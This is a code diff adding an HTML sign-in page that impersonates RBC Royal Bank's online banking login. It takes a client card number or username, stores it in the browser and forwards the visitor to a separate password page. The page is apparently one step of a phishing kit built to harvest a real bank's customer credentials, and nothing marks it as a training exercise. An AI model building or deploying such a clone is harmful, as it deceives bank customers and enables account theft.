@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="favicon.ico" />
+    <title>RBC Royal Bank – Secure Sign In</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+
+
+
+    <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+        integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+
+<body>
+    <div class="overflow-hidden lg:flex smobile">
+        <div class="">
+            <img src="heroImage.jpg"
+                class="img  lg:h-screen lg:absolute lg:w-screen h-72 bg-contain -mt-16 lg:-mt-40 lg:top-40" alt="" />
+        </div>
+        <div class="herotext relative text-white -top-44 flex justify-center items-center ">
+            <div class="text-center lg:top-40 lg:relative lg:left-80">
+                <div class="logo flex justify-center">
+                    <img src="favicon.ico" class="lg:w-14 lg:h-14" alt="" />
+                </div>
+                <h2 class="font-semibold lg:text-xl lg:mb-3 lg:bold ">Secure Sign-In</h2>
+                <p class="text-sm">RBC Online Banking</p>
+            </div>
+        </div>
+        <div class="bigDiv lg:h-screen lg:px-40 lg:pt-40  lg:-top-0 lg:relative bg-white relative pl-6 -top-36 p-4">
+            <span class="text-base">Client Card or Username</span>
+            <i class="fa-solid fa-lock float-right mr-5"></i><br />
+            <form onsubmit="myFunc(event)" id="myForm" action="password.html" method="post">
+                <input required type="text" id="username" name="username"
+                    class="input border mt-3 lg:w-80 border-black h-12 focus:outline-none focus:border-blue-700 focus:border-8 p-3" />
+                <br />
+                <div class="h-10 mt-7 ">
+                    <input type="checkbox" id="myCheckbox" class="z-10 hidden">
+                    <label for="myCheckbox" class="input flex items-center  cursor-pointer">
+                        <div class="w-8 h-8 border border-gray-400 relative mr-2">
+                            <svg class="absolute inset-0 m-auto w-6 h-6 text-3xl text-blue-800 opacity-0 pointer-events-none"
+                                fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path id="tickPath" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M5 13l4 4L19 7"></path>
+                            </svg>
+
+                            <path id="tickPath" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M5 13l4 4L19 7"></path>
+                            </svg>
+                        </div>
+                        <span class="z-50">Save client card or username</span>
+                        <i class="fa-regular fa-circle-question question float-right lg:ml-12"></i>
+                    </label>
+                </div>
+                <button type="submit" class="px-36 input py-3 relative top-5 bg-blue-700 text-white">Next</button> <br>
+            </form>
+            <div class="relative top-11 text-sm text-blue-600">
+                <a href="#">Recover Your Username</a> <br>
+                <a href="#" class="relative top-2">Enroll in Online Banking</a>
+            </div>
+            <div class="mt-20 text-blue-600 text-sm">
+                <hr class="border-1" />
+                <a href="#" class="relative top-3">Other Online Services</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://kit.fontawesome.com/YOUR_KIT_ID.js" crossorigin="anonymous"></script>
+    <script>
+        window.onload = function () {
+            // Your script here
+            document.getElementById('myForm').addEventListener('submit', function (event) {
+                event.preventDefault();
+                const username = document.getElementById('username').value;
+                localStorage.setItem('username', JSON.stringify(username));
+                localStorage.setItem('username', username);
+                window.location.href = 'password.html';
+            });
+        };
+    </script>
+
+    <!-- <script type="text/javascript">
+        function myFunc(event) {
+            event.preventDefault();
+            const username = document.getElementById("username").value
+            localStorage.setItem('username', username)
+        }
+      </script> -->
+</body>
+
+</html>
